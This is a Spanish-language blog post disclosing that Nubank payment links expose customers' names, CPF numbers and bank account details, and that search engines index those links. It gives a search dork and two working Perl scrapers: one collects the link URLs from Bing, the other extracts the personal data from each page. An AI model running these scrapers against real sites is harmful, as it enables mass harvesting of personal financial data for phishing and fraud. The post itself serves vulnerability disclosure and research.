---
layout: content
title: 'Un pequeño caso de scraping de datos personales expuestos en la web'
description: 'Durante la realización de una investigación de seguridad en aplicaciones móviles, se identificó una funcionalidad en la aplicación de Nubank que permite la creación y el envío de "links de cobro" a múltiples destinatarios. Se descubrió una vulnerabilidad en esta funcionalidad que permitió mapear datos personales, como CPF, nombre completo, número y agencia de la cuenta de varios clientes.'
og_image: https://heitorgouvea.me/images/publications/nubank-scraping/google-dorks.png
---

Tabla de contenido:
- [Resumen](#resumen)
- [Descripción](#descricion)
- [Prueba de concepto](#prueba-de-concepto)
- [Impacto](#impacto)
- [Conclusión](#conclusión)
- [Referencias](#referencias)

### Resumen

Durante una investigación de seguridad en aplicaciones móviles, se identificó una funcionalidad en la aplicación de Nubank que permite la creación y el envío de "links de cobro" a múltiples destinatarios. Se descubrió una vulnerabilidad en esta funcionalidad que permitió mapear datos personales como CPF, nombre completo, número y agencia de la cuenta bancaria de varios clientes.

DISCLAIMER: La empresa responsable fue notificada de todos los detalles de esta investigación en el menor tiempo posible y respondió de manera ética y transparente, demostrando atención y compromiso con la seguridad de la funcionalidad. Durante las pruebas realizadas, no se produjo ninguna invasión ni violación de sistemas. Además, la empresa implementó algunas medidas correctivas para reducir los riesgos potenciales asociados al problema reportado. Se proporcionaron recomendaciones adicionales para mitigar la vulnerabilidad, pero la empresa optó por no implementarlas en su totalidad.

Esta publicación también está disponible en: [Portugués](/2020/06/23/Scraping-dados-pessoais-na-web) e [Inglés](/2020/06/23/Scraping-personal-data-exposure-in-the-web).

---

### Descripción

Dentro de la aplicación de Nubank, existe una funcionalidad llamada "Cobrar", cuyo funcionamiento consiste en: 
1. ingresar un valor si se desea;
2. hacer clic en confirmar; 
3. se genera un código QR, con la opción de compartirlo o enviarlo a través de otra aplicación, como WhatsApp:

![](/images/publications/nubank-scraping/creating-a-link.png)

![](/images/publications/nubank-scraping/whatsapp-shared-link.png)

El contenido del código QR es el mismo enlace que puede compartirse mediante aplicaciones de mensajería. Al abrir el enlace se abre en el navegador, se obtiene el siguiente resultado:

![](/images/publications/nubank-scraping/personal-infos.png)

Se exponen, sin ningún tipo de control, algunos datos del usuario que generó el enlace, como: nombre completo, CPF, número de cuenta bancaria y agencia. El único requisito para acceder a esta información sensible[1] es poseer la URL correspondiente.

La URL en cuestión es generada exclusivamente por el cliente en su aplicación, y también es responsabilidad del cliente decidir cómo y con quién compartir cada enlace.

Sin embargo, estas URLs son indexadas por motores de búsqueda, lo que permite el uso de dorks[2] para identificar más enlaces relacionados con este servicio.

Ejemplo de dork para restringir la búsqueda al sitio principal de Nubank, donde las URLs contengan el patrón "/pagar/" y se excluyan los resultados del blog:

```text
site:nubank.com.br inurl:/pagar/ -blog
```

Resultado:

![](/images/publications/nubank-scraping/google-dorks.png)

Además, se observó que algunos usuarios publicaban estas URLs en otros canales, como Twitter. Un uso común de esta funcionalidad es la recepción de donaciones.

![](/images/publications/nubank-scraping/twitter-links.png)

---

### Prueba de concepto

Para demostrar el impacto del abuso de esta funcionalidad, se creó una prueba de concepto. La primera parte de esta PoC consistió en construir un código capaz de utilizar un motor de búsqueda para recolectar la mayor cantidad posible de URLs. Se desarrolló un scraper[3] utilizando Bing:

```perl
#!/usr/bin/env perl

use 5.030;
use strict;
use warnings;
use WWW::Mechanize;
use Mojo::Util qw(url_escape);

sub main {
    my $dork = $ARGV[0];

    if ($dork) {
        $dork = url_escape($dork);

        my %seen  = ();
        my $mech = WWW::Mechanize -> new();

        $mech -> ssl_opts (verify_hostname => 0);

        for my $page (0 .. 10) {
            my $url = "https://wwww.bing.com/search?q=${dork}&first=${page}0";

            $mech -> get($url);

            my @links = $mech -> links();

            foreach my $link (@links) {
                $url = $link -> url();

                next if $seen{$url}++;

                if ($url =~ m/^https?/ && $url !~ m/bing|live|microsoft|msn/) {
                    print $url, "\n";
                }
            }
        }
    }
}

exit main();
```

Con este código, se recolectaron 100 URLs válidas — este número fue limitado intencionalmente con fines demostrativos, pero podría haber sido mucho mayor:

![](/images/publications/nubank-scraping/file-with-the-urls.png)

Después de recolectar las URLs en un archivo `.txt`, se desarrolló otro scraper para extraer los datos desde las páginas de Nubank:

```perl
#!/usr/bin/env perl

use 5.030;
use strict;
use warnings;
use Mojo::DOM;
use Mojo::UserAgent;

binmode(STDOUT, ":encoding(UTF-8)");

sub main {
    my $urls_file = $ARGV[0];

    if ($urls_file) {
        my $userAgent = Mojo::UserAgent -> new (
            agent => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
        );
        
        open my $urls_filehandle, "<", $urls_file or die $!;

        while (<$urls_filehandle>) {
            chomp ($_);
            
            my $request = $userAgent -> get($_) -> result();

            if ($request -> is_success()) {
                my $account = $request -> dom -> find("tr td") -> map("text") -> join(",");

                $account =~ s/Nome,//
                && $account =~ s/CPF,//
                && $account =~ s/Banco,//
                && $account =~ s/Tipo da conta,//
                && $account =~ s/Agência,//
                && $account =~ s/Conta,//
                && $account =~ s/Agência Métodos,//;

                say $account;
            }
        }

        close ($urls_filehandle);
    }
}

exit main();
```

Y el resultado obtenido:

![](/images/publications/nubank-scraping/collect-with-names-cpfs.png)

CPF, nombre completo, número de cuenta y agencia de 100 personas, recolectados en cuestión de minutos y con pocas líneas de código.

### Impacto

La posibilidad de que un atacante abuse de esta funcionalidad disponible en los sistemas de Nubank es alta debido a la facilidad de explotación. Esto puede exponer a muchos usuarios, filtrando información sensible como se ilustró anteriormente. Además, un atacante con estos datos en mano podría usarlos para desarrollar estrategias de ingeniería social altamente dirigidas.

### Conclusión

A través de este análisis, es posible afirmar que un agente malicioso podría implementar scrapers para mapear las URLs de cobro de Nubank y, posteriormente, recolectar la información personal presente en ellas. Este artículo presentó una PoC como una posible implementación utilizando un motor de búsqueda, pero aún existen otros canales como redes sociales (Twitter, Facebook, entre otros). Este escenario podría utilizarse para convertir a los clientes de Nubank en víctimas de ataques de spear phishing o ingeniería social.

---

### Referencias

- [1] [https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)
- [2] [https://en.wikipedia.org/wiki/Google_hacking](https://en.wikipedia.org/wiki/Google_hacking)
- [3] [https://en.wikipedia.org/wiki/Web_scraping](https://en.wikipedia.org/wiki/Web_scraping)
